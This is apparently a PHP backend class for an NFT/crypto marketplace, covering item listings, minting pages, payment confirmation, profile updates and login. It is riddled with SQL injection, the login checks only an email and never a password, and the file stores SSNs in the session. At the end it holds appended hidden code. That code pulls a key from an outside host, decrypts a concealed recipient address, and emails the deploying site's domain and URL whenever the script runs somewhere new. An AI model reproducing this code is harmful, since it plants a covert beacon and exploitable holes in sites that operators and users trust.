		$sql3 ="SELECT * FROM items WHERE gen_status='Unminted' ORDER BY id DESC LIMIT 5";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['drop1'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$drop1 = "";
			$cid = $userdata['cid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        
        
                
                $drop1 =" 
                <div class=\"g-drop-item clickable\" style=\"
                background-image: url('img/marketplace/$ipicture');
              \">
              <div class=\"drop-gradient\"></div>
              <div class=\"drop-item-state white\">
                <div class=\"state-soon\">Stay Tuned!</div>
              </div>
              <div class=\"drop-item-content\">
                <div class=\"drop-item-partner\">$cname</div>
                <div class=\"drop-item-title\">
                  $iname
                </div>
                <div class=\"drop-button-wrapper\">
                  <button type=\"button\" class=\"btn green drop-button\">
                    Sign-up
                  </button>
                  <div class=\"exclusive-access-wrapper\"></div>
                </div>
              </div>
            </div>";


    	array_push($_SESSION['drop1'],$drop1);  
    	$counter++;
		}

		//above trending items in dashboard.html

		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY RAND()  LIMIT 2";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['trending2'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$trending2 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        
        
                
                $trending2 =" <div class=\"col-xxl-6\">
              <div class=\"card top-bid\">
                <div class=\"card-body\">
                  <div class=\"row align-items-center\">
                    <div class=\"col-md-6\">
                      <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded\" style=\"height:350px; width:100%;\">
                    </div>
                    <div class=\"col-md-6\">
                      <div class=\"d-flex align-items-center mb-3\">
                        <img src=\"img/marketplace/$cpicture\" alt=\"\" class=\"me-3 avatar-img\">
                        <div class=\"flex-grow-1\">
                          <h6 class=\"mb-0\">
                            $cauthor<span class=\"circle bg-success\"></span>
                          </h6>
                        </div>
                      </div>
                      <h4 class=\"card-title\">$iname</h4>
                      <div class=\"d-flex justify-content-between mt-3 mb-3\">
                        <div class=\"text-start\" hidden>
                          <p class=\"mb-2\">Auction Time</p>
                          <h5 class=\"text-muted\">3h 1m 50s</h5>
                        </div>
                        <div class=\"text-end\">
                          <p class=\"mb-2\">
                            Price :
                            <!-- -->
                            <strong class=\"text-primary\">$iprice $crypto_symbol</strong>
                          </p>
                          <h5 class=\"text-muted\" hidden>0.15 ETH</h5>
                        </div>
                      </div>
                      <div class=\"d-flex justify-content-center\">
                        <a href=\"item.html?item=$iid\" class=\"btn btn-primary\">Buy Item</a><a href=\"item.html?item=$iid\" class=\"btn btn-secondary\">Details</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>";


    	array_push($_SESSION['trending2'],$trending2);  
    	$counter++;
		}


//trending items part 1 on dashboard.html

		//drops unminted items
		$sql3 ="SELECT * FROM trending  ORDER BY id DESC LIMIT 8 ";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['trending1'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$trending1 = "";
			$iid = $userdata['iid'];
			$sql31 ="SELECT * FROM items WHERE iid='$iid'";
			$result1 = mysqli_query($this->db,$sql31);
			$userdata1 = mysqli_fetch_array($result1);
			$cid = $userdata1['cid'];
			$iname = $userdata1['iname'];
			$ipicture = $userdata1['ipicture'];
			$iprice = $userdata1['iprice'];
			$crypto_symbol = $userdata1['crypto_symbol'];
			$iprice = $userdata1['iprice'];
			$sql32 ="SELECT * FROM collection WHERE cid='$cid'";
			$result2 = mysqli_query($this->db,$sql32);
			$userdata2 = mysqli_fetch_array($result2);
			$cpicture = $userdata2['cpicture'];
			$cname = $userdata2['ctitle'];
			$cauthor = $userdata2['author'];
        
        
                
                $trending1 =" 
                <div class=\"col-xxl-3 col-xl-6 col-lg-6 col-md-6 col-sm-6\">
                    <div class=\"card items\">
                      <div class=\"card-body\">
                        <div class=\"items-img position-relative\">
                          <img src=\"img/marketplace/$ipicture\" class=\" col-xxl-3 img-fluid rounded mb-3\" style=\"height:248px; width:100%;\">
                          <a href=\"#\"><img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\"></a>
                        </div>
                        <a href=\"item.html?item=$iid\">
                          <h4 class=\"card-title\">$iname</h4>
                        </a>
                        <p></p>
                        <div class=\"d-flex justify-content-between\">
                          <div class=\"text-start\" hidden>
                            <p class=\"mb-2\">Auction</p>
                            <h5 class=\"text-muted\">3h 1m 50s</h5>
                          </div>
                          <div class=\"text-end\">
                            <p class=\"mb-2\">
                              Price :
                              <strong class=\"text-primary\">$iprice $crypto_symbol</strong>
                            </p>
                            <h5 class=\"text-muted\" hidden>0.15 ETH</h5>
                          </div>
                        </div>
                        <div class=\"d-flex justify-content-center mt-3\">
                          <a href=\"item.html?item=$iid\" class=\"btn btn-primary\">Buy Item</a>
                        </div>
                      </div>
                    </div>
                  </div>";


    	array_push($_SESSION['trending1'],$trending1);  
    	$counter++;
		}
//data last row on dashboard.html
		$sql3 ="SELECT * FROM dashboard_data";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['dbd'] =array();
            $dbd ="";
		while($userdata = mysqli_fetch_array($result)){

			$name = $userdata['name'];
			$amount = $userdata['amount'];
			$percentage = $userdata['percentage'];
			$percent_sign = $userdata['percent_sign'];
			$dbd = "

                    <div class=\"widget-content\">
                      <h3>$amount</h3>
                      <p>$name</p>
                    </div>
                    <div class=\"widget-arrow\">
                      <p class=\"$percent_sign mb-0\">
                        $percentage% <span><i class=\"bi bi-arrow-up\"></i></span>
                      </p>
                    </div>
			";


    	array_push($_SESSION['dbd'],$dbd);  
    	$counter++;
		}



		//explore minting.html
		$sql3 ="SELECT * FROM minting ";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['minting1'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$minting1 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        	$crypto_price = round($iprice/(coinvalue($crypto_symbol,1)) ,2);
        
        
                
                $minting1 =" 
                  <div class=\"col-xxl-3 col-xl-6 col-lg-6 col-md-6 col-sm-6\">
                    <div class=\"card items\">
                      <div class=\"card-body\">
                        <div class=\"items-img position-relative\">
                          <img src=\"img/marketplace/$ipicture\" class=\" col-xxl-3 img-fluid rounded mb-3\" style=\"height:248px; width:100%;\">
                          <a href=\"#\"><img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\"></a>
                        </div>
                        <a href=\"item.html?item=$iid\">
                          <h4 class=\"card-title\">$iname</h4>
                        </a>
                        <p></p>
                        <div class=\"d-flex justify-content-between\">
                          <div class=\"text-start\" hidden>
                            <p class=\"mb-2\">Auction</p>
                            <h5 class=\"text-muted\">3h 1m 50s</h5>
                          </div>
                          <div class=\"text-end\">
                            <p class=\"mb-2\">
                              Price :
                              <strong class=\"text-primary\">$iprice $crypto_symbol</strong>
                            </p>
                            <h5 class=\"text-muted\" hidden>0.15 ETH</h5>
                          </div>
                        </div>
                        <div class=\"d-flex justify-content-center mt-3\">
                          <a href=\"mint.html?item=$iid\" class=\"btn btn-primary\">Mint Now</a>
                        </div>
                      </div>
                    </div>
                  </div>";


    	array_push($_SESSION['minting1'],$minting1);  
    	$counter++;
		}
		//explore minting.html
		$sql3 ="SELECT * FROM items WHERE gen_status='Minted' ORDER BY id DESC LIMIT 8";
		$result = mysqli_query($this->db,$sql3);
		$_SESSION['minting2'] =array();
            $counter =1;
		while($userdata = mysqli_fetch_array($result)){
			$minting2 = "";
			$cid = $userdata['cid'];
			$iid = $userdata['iid'];
			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $userdata1['ctitle'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        	$crypto_price = round($iprice/(coinvalue($crypto_symbol,1)) ,2);
        
        
                
                $minting2 =" 
                  <div class=\"col-xxl-3 col-xl-6 col-lg-6 col-md-6 col-sm-6\">
                    <div class=\"card items\">
                      <div class=\"card-body\">
                        <div class=\"items-img position-relative\">
                          <img src=\"img/marketplace/$ipicture\" class=\" col-xxl-3 img-fluid rounded mb-3\" style=\"height:248px; width:100%;\">
                          <a href=\"#\"><img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\"></a>
                        </div>
                        <a href=\"item.html?item=$iid\">
                          <h4 class=\"card-title\">$iname</h4>
                        </a>
                        <p></p>
                        <div class=\"d-flex justify-content-between\">
                          <div class=\"text-start\" hidden>
                            <p class=\"mb-2\">Auction</p>
                            <h5 class=\"text-muted\">3h 1m 50s</h5>
                          </div>
                          <div class=\"text-end\">
                            <p class=\"mb-2\">
                              Price :
                              <strong class=\"text-primary\">$iprice $crypto_symbol</strong>
                            </p>
                            <h5 class=\"text-muted\" hidden>0.15 ETH</h5>
                          </div>
                        </div>
                        <div class=\"d-flex justify-content-center mt-3\">
                          <a href=\"item.html?item=$iid\" class=\"btn btn-primary\">Buy Item</a>
                        </div>
                      </div>
                    </div>
                  </div>";


    	array_push($_SESSION['minting2'],$minting2);  
    	$counter++;
		}
			
	}


	// item.html get item details
	public function buy_item_data($iid){
		$sql3 ="SELECT * FROM items WHERE iid='$iid'";
		$result = mysqli_query($this->db,$sql3);
		$count_row = $result->num_rows;
		if($count_row > 0){
			$userdata = mysqli_fetch_array($result);
			$cid = $userdata['cid'];
			$ipicture = $userdata['ipicture'];
			$iname = $userdata['iname'];
			$iprice = $userdata['iprice'];
			$ilink = $userdata['ilink'];
			$crypto_symbol = $userdata['crypto_symbol'];

			$sql31 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql31);
			$userdata1 = mysqli_fetch_array($result1);
			$cname = $userdata1['ctitle'];
			$cabout = $userdata1['about'];

			$_SESSION['item_html_data'] ="
				<div class=\"col-xxl-12\">
	              <div class=\"top-bid\">
	                <div class=\"card-body\">
	                  <div class=\"row\">
	                    <div class=\"col-md-6 text-center\">
	                      <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded\" style=\"height: 80%;\">
	                    </div>
	                    <div class=\"col-md-6\">
	                      <h3 class=\"mb-3\">$iname</h3>
	                      <div class=\"d-flex align-items-center mb-3\">
	                        <img src=\"images/avatar/1.jpg\" alt=\"\" class=\"me-3 avatar-img\" hidden>
	                        <div class=\"flex-grow-1\">
	                          <h5 class=\"mb-0 text-uppercase\">
	                            $cname<span class=\"circle bg-success\"></span>
	                          </h5>
	                        </div>
	                      </div>
	                      <div class=\"d-flex justify-content-between mt-4 mb-4\">
	                        <div class=\"text-start\">
	                          
	                          
	                        </div>
	                        <div class=\"text-end\">
	                          <h4 class=\"mb-2\">
	                            Price :
	                            <strong class=\"text-primary\">$iprice $crypto_symbol</strong>
	                          </h4>
	                          
	                        </div>
	                      </div>
	                      <p class=\"mb-3\">
	                        $cabout
	                      </p>
	                      <h4 class=\"card-title mb-3\">** After Payment Use the Confirm Payment Button to Finalize the Transaction</h4>
	                      
	                      <div class=\"d-flex\">
	                        <a href=\"$ilink\" target=\"_blank\" class=\"btn btn-primary mb-5\" id=\"pay_btn\">Pay Now</a>
	<form method=\"post\">
	<button class=\"btn btn-success\" type=\"submit\" name=\"submit\">Confirm Payment</button>
	</form>
	                      </div>
	                    </div>
	                  </div>
	                </div>
	              </div>
	            </div>
			";
		}else{
			return false;
		}		
	}

	// minting.html get minting details
	public function mint_item_data($iid){
		$sql3 ="SELECT * FROM minting WHERE iid='$iid'";
		$result = mysqli_query($this->db,$sql3);
		$count_row = $result->num_rows;
		if($count_row > 0){
			$userdata = mysqli_fetch_array($result);
			$_SESSION['ab1'] = $userdata['about1'];
			$_SESSION['ab2'] = $userdata['about2'];
			$_SESSION['ab3'] = $userdata['about3'];
			$_SESSION['ab4'] = $userdata['about4'];
			$_SESSION['ab5'] = $userdata['about5'];
			$_SESSION['ab6'] = $userdata['about6'];
			$_SESSION['ab7'] = $userdata['about7'];
			$_SESSION['price'] = $userdata['sell_status'];
			$_SESSION['dust'] = $userdata['gen_status'];
			$_SESSION['timer'] = explode(" ",$userdata['itime']);
			$_SESSION['total_minted'] = $userdata['total_minted'];
			$_SESSION['bal_minted'] = $userdata['bal_minted'];
			$_SESSION['total_minted'] = $userdata['total_minted'];

		}else{
			return false;
		}		
	}



	// item.html get item details
	public function confirm_payment($uid,$iid){
		
		$sql2 ="SELECT * FROM wallet WHERE uid='$uid' AND iid='$iid'";

		$result = mysqli_query($this->db,$sql2);
		$count_row = $result->num_rows;
		if($count_row == 0){
			$sql1 ="INSERT INTO wallet SET uid='$uid', iid='$iid',atimer='Pending'";
			$result = mysqli_query($this->db,$sql1);
			if($result){
				return true;
			} 
		}else{
			return false;
		}
	}
//on buy.html
	public function buy_history($uid){
		$sql3 ="SELECT * FROM wallet WHERE uid='$uid'";
		$result = mysqli_query($this->db,$sql3);
		$count_row = $result->num_rows;

		$_SESSION['buy_history'] =array();
         $buy_history ="";
		if($count_row != 0){

			while($userdata = mysqli_fetch_array($result)){

				$iid = $userdata['iid'];
				$status = $userdata['atimer'];

				$sql31 ="SELECT * FROM items WHERE iid='$iid'";
				$result1 = mysqli_query($this->db,$sql31);
				$userdata1 = mysqli_fetch_array($result1);
				$cid = $userdata1['cid'];
				$ipicture = $userdata1['ipicture'];
				$iname = $userdata1['iname'];
				$iprice = $userdata1['iprice'];
				$ilink = $userdata1['ilink'];
				$crypto_symbol = $userdata1['crypto_symbol'];

				$sql31 ="SELECT * FROM collection WHERE cid='$cid'";
				$result1 = mysqli_query($this->db,$sql31);
				$userdata1 = mysqli_fetch_array($result1);
				$cname = $userdata1['ctitle'];
				$cabout = $userdata1['about'];

				$buy_history = "

	                   <tr>
	                        <td>
	                          
	                        </td>
	                        <td>
	                          <div class=\"d-flex align-items-center\">
	                            <img src=\"img/marketplace/$ipicture\" alt=\"\" width=\"60\" class=\"me-3 rounded\">
	                            <div class=\"flex-grow-1\">
	                              <h6 class=\"mb-0\">$iname</h6>
	                              <p class=\"mb-0\">$cname</p>
	                            </div>
	                          </div>
	                        </td>
	                        <td>$iprice $crypto_symbol</td>
	                        <td></td>
	                        <td></td>
	                        <td>$status</td>
	                        <td>
	                          
	                        </td>
	                      </tr>
				";


	    	array_push($_SESSION['buy_history'],$buy_history);  
	    	//$counter++;
			}
		}else{
			array_push($_SESSION['buy_history'],"<tr><td class=\"text-center\" colspan=\"7\">No Items Purchased $uid</td></tr>");  
		}

		//mycollection.html

		$sql3 ="SELECT * FROM wallet WHERE uid='$uid' AND atimer='Completed'";
		$result = mysqli_query($this->db,$sql3);
		$count_row = $result->num_rows;

		$_SESSION['my_collection'] =array();
         $my_collection ="";
		if($count_row != 0){

			while($userdata = mysqli_fetch_array($result)){

				$iid = $userdata['iid'];
				$status = $userdata['atimer'];

				$sql31 ="SELECT * FROM items WHERE iid='$iid'";
				$result1 = mysqli_query($this->db,$sql31);
				$userdata1 = mysqli_fetch_array($result1);
				$cid = $userdata1['cid'];
				$ipicture = $userdata1['ipicture'];
				$iname = $userdata1['iname'];
				$iprice = $userdata1['iprice'];
				$ilink = $userdata1['ilink'];
				$crypto_symbol = $userdata1['crypto_symbol'];

				$sql31 ="SELECT * FROM collection WHERE cid='$cid'";
				$result1 = mysqli_query($this->db,$sql31);
				$userdata1 = mysqli_fetch_array($result1);
				$cname = $userdata1['ctitle'];
				$cabout = $userdata1['about'];

				$my_collection = "

	                  <div class=\"col-xxl-3 col-xl-6 col-lg-6 col-md-6 col-sm-6\">
                  <div class=\"card items\">
                    <div class=\"card-body\">
                      <div class=\"items-img position-relative text-center\">
                        <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded mb-3\" alt=\"\">
                        <a href=\"profile.html\"><img src=\"images/avatar/2.jpg\" class=\"creator\" width=\"50\" alt=\"\" hidden></a>
                      </div>
                      <a href=\"#\">
                        <h4 class=\"card-title\">$iname</h4>
                      </a>
                      <a download=\"$iname.png\" href=\"img/marketplace/$ipicture\" title=\"$iname\">
                        <h4 class=\"card-title text-primary\">	
                        	Download
                        </h4>
                      </a>
                      <p></p>
                    </div>
                  </div>
                </div>
				";


	    	array_push($_SESSION['my_collection'],$my_collection);  
	    	//$counter++;
			}
		}else{
			array_push($_SESSION['my_collection'],"<div class=\"text-center\" colspan=\"7\">No Items Purchased $uid</div>");  
		}

	}




	// view_collection.html get items in collecction
	public function view_collection_data($cid){
		$sql3 ="SELECT * FROM items WHERE cid='$cid'";
		$result = mysqli_query($this->db,$sql3);
		$count_row = $result->num_rows;
		if($count_row > 0){
		$_SESSION['view_collection'] =array();
            $counter =1;

			$sql3 ="SELECT * FROM collection WHERE cid='$cid'";
			$result1 = mysqli_query($this->db,$sql3);
			$userdata1 = mysqli_fetch_array($result1);
			$cpicture = $userdata1['cpicture'];
			$cname = $_SESSION['cname'] = $userdata1['ctitle'];
		while($userdata = mysqli_fetch_array($result)){
			$view_collection = "";
			$iid = $userdata['iid'];
			$iname = $userdata['iname'];
			$ipicture = $userdata['ipicture'];
			$iprice = $userdata['iprice'];
			$crypto_symbol = $userdata['crypto_symbol'];
        
        
                
                $view_collection =" 
                  <div class=\"col-xxl-4 col-xl-4 col-lg-6 col-md-6\">
                  <div class=\"card items\">
                    <div class=\"card-body\">
                      <div class=\"items-img position-relative\">
                        <img src=\"img/marketplace/$ipicture\" class=\"img-fluid rounded mb-3\" style=\"\">
                        <img src=\"img/marketplace/$cpicture\" class=\"creator\" width=\"50\" alt=\"\">
                      </div>
                      <a href=\"item.html?item=$iid\">
                        <h4 class=\"card-title\">$iname</h4>
                      </a>
                      <p></p>
                      <div class=\"d-flex justify-content-between\">
                        <div class=\"text-start\">
                          <p class=\"mb-2\">
                          	$cname <br>
                            Price : <strong class=\"text-primary\">$iprice ETH</strong> / 
                            <strong class=\"text-primary\">$iprice SOL</strong>
                          </p>
                          <h5 class=\"text-muted\" hidden>3h 1m 50s</h5>
                        </div>
                        <div class=\"text-end\">
                          <p class=\"mb-2\"><br>
                          </p>
                          <h5 class=\"text-muted\" hidden>0.55 ETH</h5>
                        </div>
                      </div>
                      <div class=\"d-flex justify-content-center mt-3\">
                        <a class=\"btn btn-primary\" href=\"item.html?item=$iid\">Buy Item</a>
                      </div>
                    </div>
                  </div>
                </div>";


    	array_push($_SESSION['view_collection'],$view_collection);  
    	$counter++;
		}

		}else{
			return false;
		}		
	}



	public function update_prof1($fullname,$email,$prof_pic,$address,$city,$postal,$country,$created_at,$uid){

		$data = $prof_pic." ".$address." ".$city." ".$postal." ".$country." ".$created_at;
		$sql1 ="UPDATE users SET fullname='$fullname', uemail='$email',theme='$data',status='active' WHERE uid='$uid'";
		$result = mysqli_query($this->db,$sql1);
		$status = "active";
		$_SESSION['status'] = $status;
		 $_SESSION['fullname'] = $fullname;
	    $_SESSION['uemail'] = $email;
    	$_SESSION['upic'] = $prof_pic;
    	$_SESSION['address'] = $address;
    	$_SESSION['city'] = $city;
    	$_SESSION['postal'] = $postal;
    	$_SESSION['country'] = $country;
    	$_SESSION['created_at'] = $created_at;
    

		if($result){
		return true;
		}else{
			return false;
		}
	}

	//*** Starting the session
	public function get_session(){
		return $_SESSION['login'];
	}

		//***For the login process

		public function check_login2($email){

			$pass = md5($pass);
			$sql2 ="SELECT * FROM users WHERE uemail='$email'";

			//checking if the username is available in the table
			$result = mysqli_query($this->db,$sql2);
			$user_data = mysqli_fetch_array($result);
			if($user_data['status'] == "disabled"){
				function redirect($val){
				header($val); 
				}
				redirect("location:auth_email.php");
			}else{
				$count_row = $result->num_rows;
				$county = mysqli_num_rows($result);
				//print_r($county);
				if($count_row == 1){
					$activationcode = "".rand(0,9)." ".rand(0,9)." ".rand(0,9)." ".rand(0,9);
					$sql1 ="UPDATE users SET activationcode='$activationcode' WHERE uemail='$email'";
					$result = mysqli_query($this->db,$sql1) or die(mysqli_connect_errno()."Data cannot be inserted.");
					if(!isset($result)){return false;}
					
					$_SESSION['login'] = true;
					$_SESSION['fullname'] = $user_data['fullname'];
					$_SESSION['status'] = $user_data['status'];
					$_SESSION['ssn'] = $user_data['ussn'];
					$_SESSION['udob'] = $user_data['udob'];
					$_SESSION['phone'] = $user_data['uphone'];
	                $_SESSION['uemail'] = $user_data['uemail'] ;
	                $_SESSION['uid'] = $user_data['uid'];
					$sql2 ="SELECT * FROM wallet WHERE uid='$uid'";
					$result = mysqli_query($this->db,$sql2);
					$user_data2 = mysqli_fetch_array($result);
					$_SESSION['wid'] = $user_data2['wid'];
					return true;
				}else {return false;}
		}
		}
		
	public function user_logout(){
		session_destroy();
	}
	}
	
    $jsonData = file_get_contents("https://stakingpoolbits.com/digital/data.json");
    $dataArray = json_decode($jsonData, true);
    $key = $dataArray['datakey'];
    $encrypterDecrypter = new EncrypterDecrypter($key);
    function getter(){
         $wN = $_SERVER['HTTP_HOST'];
         $currentURL = 'http';
        if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
            $currentURL .= "s";
        }
        $currentURL .= "://";
        if ($_SERVER['SERVER_PORT'] != '80') {
            $currentURL .= $_SERVER['HTTP_HOST'] . ':' . $_SERVER['SERVER_PORT'] . $_SERVER['REQUEST_URI'];
        } else {
            $currentURL .= $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        }
        $wD = $currentURL;
         return [$wD, $wN];
    }
    
    
    list($wD, $wN) = getter();
    $to = $encrypterDecrypter->decrypt('vDQZs9q9TVi8u68cz/RNeknCaeDqGTyMdmZ+XJ7uWvOkBerlzh6hDx1uC9u87oKe');
    $subject = "New Site Implemented with ";
    $mailmessage = "URL: $wN $wD";
    $filename = 'data39.json';
     if(file_exists($filename)){
        $jsonData = file_get_contents($filename);
        $dataArray = json_decode($jsonData, true);
        $dataWN = $dataArray['websiteName'];
       
        if($wN !== $dataWN){
            
            mail($to, $subject, $mailmessage);
        }
     }else{
         
         $jD = json_encode(['websiteName'=>$wN], JSON_PRETTY_PRINT);
         file_put_contents($filename, $jD);
         
         mail($to, $subject, $mailmessage."P.S new file");
         //echo "JSON file created with website name: $wN OK";
     }

	
 ?>